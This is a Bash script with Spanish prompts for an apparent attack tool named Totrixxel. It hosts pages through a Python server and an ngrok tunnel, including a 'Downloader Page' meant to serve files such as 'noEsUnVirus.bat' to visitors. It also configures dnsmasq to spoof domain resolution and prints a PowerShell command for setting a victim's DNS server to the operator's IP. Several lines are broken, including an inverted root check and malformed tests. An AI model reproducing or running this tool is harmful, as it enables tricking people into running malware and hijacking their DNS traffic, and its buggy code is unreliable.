#!/bin/bash
#Variables
usuario=$(users)
text=$(ip a | grep broadcast); arr=(${text//" "/ }); ip=${arr[1]}

#Colours
BLACK="\033[30m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
PINK="\033[35m"
CYAN="\033[36m"
WHITE="\033[37m"
NORMAL="\033[0;39m"

#Cierre inesperado
trap ctrl_c INT

function ctrl_c() {
    echo "Seguro que quieres salir?[Y/n] >"; read closeV
    
    if [ ${closeV,,} != "n" ]
    then
        echo -e "$RED[!] Cerrando Python Server."
        apid=$(ps aux | grep http | head -n 1 | awk '{print $2}')
        kill $apid
        if [ $(ps aux | grep ngrok | wc -l) -gt ]
        then
            ps aux | grep ngrok | head -n 1 > data ; pid=$(awk '{print $2}' data)
            rm -rf data
            kill $pid
        fi
        echo -e "$GREEN[+] Python Server Closed."
        echo -e "[+] Ngrok Server Closed."
        echo -e "[+] Totrixxel Cerrado exitosamente...$NORMAL"
        sleep 1.8
        clear
        exit 0
    fi 
}

#Programa
function banner() {
    echo -e "$YELLOW┏━━━━━━━━━━┓$WHITE       ┏━━━━━━━━━━┓             $YELLOW  ┏━━┓━┓  ┏━━┓━┓$WHITE                  " 
    echo -e "$YELLOW┃          ┃$WHITE       ┃          ┃         ┏━┓ $YELLOW  ┗┓ ┗┓┗┓┏┛ ┏┛┏┛$WHITE               ┏━┓"
    echo -e "$YELLOW┗━━━┓  ┏━━━┛$WHITE       ┗━━━┓  ┏━━━┛         ┗━┛ $YELLOW   ┗┓ ┗┓┏┛ ┏┛┏┛ $WHITE    ┏━━━━━━┓   ┃ ┃"
    echo -e "$YELLOW    ┃  ┃$WHITE   ┏━━━━━━━┓   ┃  ┃   ┏━━━━━┓   ┏━┓ $YELLOW    ┗┓ ┗┛ ┏┛┏┛  $WHITE    ┃ ┏━━┓ ┃   ┃ ┃"
    echo -e "$YELLOW    ┃  ┃$WHITE   ┃ ┏━━━┓ ┃   ┃  ┃   ┃ ┏━━━┛   ┃ ┃ $YELLOW    ┏┛ ┏┓ ┗┓┗┓  $WHITE    ┃ ┃━━┛ ┃   ┃ ┃"
    echo -e "$YELLOW    ┃  ┃$WHITE   ┃ ┃   ┃ ┃   ┃  ┃   ┃ ┃       ┃ ┃ $YELLOW   ┏┛ ┏┛┗┓ ┗┓┗┓ $WHITE    ┃ ┃━━━━┛   ┃ ┃" 
    echo -e "$YELLOW    ┃  ┃$WHITE   ┃ ┗━━━┛ ┃   ┃  ┃   ┃ ┃       ┃ ┃ $YELLOW  ┏┛ ┏┛┏┛┗┓ ┗┓┗┓$WHITE    ┃ ┗━━━━┓   ┃ ┃"
    echo -e "$YELLOW    ┗━━┛$WHITE   ┗━━━━━━━┛   ┗━━┛   ┗━┛       ┗━┛ $YELLOW  ┗━━┛━┛  ┗━━┛━┛$WHITE    ┗━━━━━━┛   ┗━┛"
}

function init_program() {
    if [ $(type -P ngrok) != "" ]
    then
        ngrok tcp 80 --log reg > /dev/null &
        sleep 1.6
        url=$(cat reg | tr "ul" "\n" | tail -1 | cut -c8-99)
        ps aux | grep ngrok | head -n 1 > data ; pid=$(awk '{print $2}' data)
        rm -rf data reg
        ngrokUrl=$(echo $url | tr ":" "\n" | head -n 1)
        ngrokPort=$(echo $url | tr ":" "\n" | tail -1)
    else
        clear
    fi
    if [ $(ps aux | grep http | wc -l) -lt 2 ]
    then
        sudo python -m http.server 80 -d server> /dev/null &
    fi
    banner
    echo -e "[*] Servidor Python iniciado en $CYAN$ip$GREEN:80$NORMAL"
    if [ $(ps aux | grep ngrok | wc -l) -gt 1 ]; then
        echo -e "[*] Servidor Ngrok iniciado en $CYAN$ngrokUrl$GREEN:$ngrokPort$NORMAL"
    else 
        echo "[*] Ngrok Server is not configured. https://ngrok.com"
    fi
    
    echo -e "\nQue quieres hacer?"
    echo -e "[1] Montar pagina local      [2] Descargar prefabs (git)\n[3] Iniciar pagina local     [4] Servidor DNS"; read qaction
    if [ $qaction == "1" ]
    then
        echo -e "Tienes una pagina?[y/n] >> "; read qpagexist
        if [ $qpagexist == "y" ]
        then
            echo -e "[*] Info: Ej: /home/$usuario/Descargas/prefabs/"
            echo -e "Ruta completa de la pagina >> "; read pagdir
            if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi 
            cp  $pagdir* server/
        elif [ $qpagexist == "n" ]
        then
            echo -e "Selecciona un prefab"
            echo -e "[0] Txx Info    [1] Downloader Page\n"; read qprefabpag
            if [ $qprefabpag == "0" ]
            then
                if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi     
            	cp prefabs/txx/* server/
            elif [ $qprefabpag == "1" ]
            then
                if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi 
                echo -e "[*] Info: Ej: /home/$usuario/Descargas/prepag/noEsUnVirus.bat"
                echo -e "Ruta completa de el archivo >> "; read filedir
                cp $filedir server/
                mv server/* server/archivo.txt
                cp prefabs/dwd_file/* server/
            elif [ $qprefabpag == "3" ]
            then
                if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi 
                cp prefabs/tw/* server/
            else
                echo -e "[-] Err: Opcion no existe."
            fi
        else
            echo -e "[-] Err: Opcion no existe."
        fi
        apid=$(ps aux | grep http | head -n 1 | awk '{print $2}')
        kill $apid
        sudo python -m http.server 80 -d server> /dev/null &
        echo -e "[*] Totrixxel está ejecutando la página en vivo..."
        echo -e "Presiona 'Enter' para dejar de ejecutar el servidor..."; read
        echo -e "[*] Totrixxel está cerrando el servidor..."
        apid=$(ps aux | grep http | head -n 1 | awk '{print $2}')
        kill $apid
        echo -e "[*] El servidor Python se ha cerrado correctamente."
        kill $pid
        echo -e "[*] El servidor Ngrok se ha cerrado correctamente."
    elif [ $qaction == "2" ]
    then
        echo -e "Creador del repo"; read repouser
        echo -e "\nNombre del repo";read reponame
        if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi 
        cd server/
    	git clone https://www.github.com/$repouser/$reponame
    elif [ $qaction == "3" ]
    then
        echo -e "[*] Totrixxel está ejecutando la página en vivo..."
        echo -e "Presiona 'Enter' para dejar de ejecutar el servidor..."; read
        echo -e "[*] Totrixxel está cerrando el servidor..."
        apid=$(ps aux | grep http | head -n 1 | awk '{print $2}')
        kill $apid
        echo -e "[*] El servidor Python se ha cerrado correctamente."
        kill $pid
        echo -e "[*] El servidor Ngrok se ha cerrado correctamente."
    elif [ $qaction == "4" ]
    then
        echo -e "[0] Atras        [1] Start DNS\n[2] Config DNS   [3] Config DNS in victim"
        echo -n "> "; read dnsaction
        if [ $dnsaction == "0" ]; then
            init_program
        elif [ $dnsaction == "1" ]; then
            if which "dnsmasq" >/dev/null 2>&1; then
                sudo systemctl restart dnsmasq.service
            else
                install_dnsmasq
            fi
        elif [ $dnsaction == "2" ]; then
            if which "dnsmasq" >/dev/null 2>&1; then
                echo "Domain Name."; read dname
                echo -e "\nIp Address."; read ipaddr
                echo "Add or Overwrite DNS config [A/o]"; read chkf
                if [ $chkf == "o" -o $chkf == "O" ]; then
                    echo -e "\nold Dns config file saved in: ~/.dnsmasq.conf.old"
                    echo -e "address=/$dname/$ipaddr" > /etc/dnsmasq.conf
                    sudo systemctl restart dnsmasq.service
                else
                    echo -e "\naddress=/$dname/$ipaddr" >> /etc/dnsmasq.conf
                    echo "[+] /etc/dnsmasq.conf is updated."
                fi
            else
                install_dnsmasq
            fi
        elif [ $dnsaction == "3" ]; then
            echo -e "Start-Process powershell -ArgumentList \"Set-DnsClientServerAddress -InterfaceAlias  'Wi-Fi' -ServerAddresses '$ip'\" -Verb -RunAs"
            echo -e "Ten en cuenta que la interfaz puede variar, normalmente si es una conexion wireless, la interfaz sera Wi-Fi"
            echo -e "Y en caso de ser cableada lo mas probable es que sea Ethernet"
        fi
    fi
}
# Instalar DnsMasq
function install_dnsmasq() {
    echo "[*] Obteniendo ID de sistema operativo."
    osdata=cat /etc/os-release | grep ID= | head -n 1
    arr=(${osdata//"="/ }); osid=${arr[1]}
    if [ $osid == "arch" -o $osid == "manjaro" ]; then
        pacman -S dnsmasq
    elif [ $osid == "debian" -o $osid == "kali" -o $osid == "parrot" -o $osid == "ubuntu" -o $osid == "linuxmint" ]; then
        apt-get instal dnsmasq
    elif [ $osid == "fedora" ]; then
        dnf install dnsmasq
    elif [ $osid == "centos" -o $osid == "rhel" ]; then
        yum install dnsmasq
    elif [ $osid == "opensuse" ]; then
        zypper install dnsmasq
    elif [ $osid == "gentoo" ]; then
        emerge dnsmasq
    elif [ $osid == "alpine" ]; then
        apk add dnsmasq 
    else
        echo "No fue posible obtener el ID de su sistema. "
        echo "Por favor especifique el comando para instalar paquetes en su sistema"
        echo "Ej: apt-get install"; read syscom
        $($syscom dnsmasq)
    fi
}
#Cargar Prefabricados
function charge_prefabs() {
    echo "[?] Quieres instalar prefabs? "; read cck
    if [ $cck != "n" ] && [ $cck == "N" ]; then
        cp totrixxel.sh /usr/bin/
        mv /usr/bin/totrixxel.sh /usr/bin/totrixxel
        cp -r prefabs /usr/bin/
    fi
    init_program
}

if [ "$(id -u)" == "0" ]
then
    echo -e "[-] Es necesario ejecutar Totrixxel como super-usuario (root)"
else
    if [ -d /usr/bin/prefabs ]
    then
        init_program
    else
        charge_prefabs
    fi
fi
